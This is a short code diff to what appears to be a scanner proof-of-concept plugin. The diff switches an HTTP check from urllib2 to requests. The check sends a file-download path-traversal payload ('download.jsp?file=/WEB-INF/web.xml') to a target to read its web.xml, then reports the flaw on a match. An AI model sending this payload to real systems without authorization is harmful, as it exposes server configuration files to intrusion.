@@ -34,10 +34,8 @@ class Poc(ABPoc):
             
             payload = "/cw/skin1/jsp/download.jsp?file=/WEB-INF/web.xml"
             verify_url = self.target + payload
-            req = urllib2.Request(verify_url)
-            content = urllib2.urlopen(req).read()
-            
-            if req.getcode() == 200 and 'log4jConfigLocation' in content:
+            req = requests.get(verify_url)
+            if req.status_code == 200 and 'log4jConfigLocation' in req.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
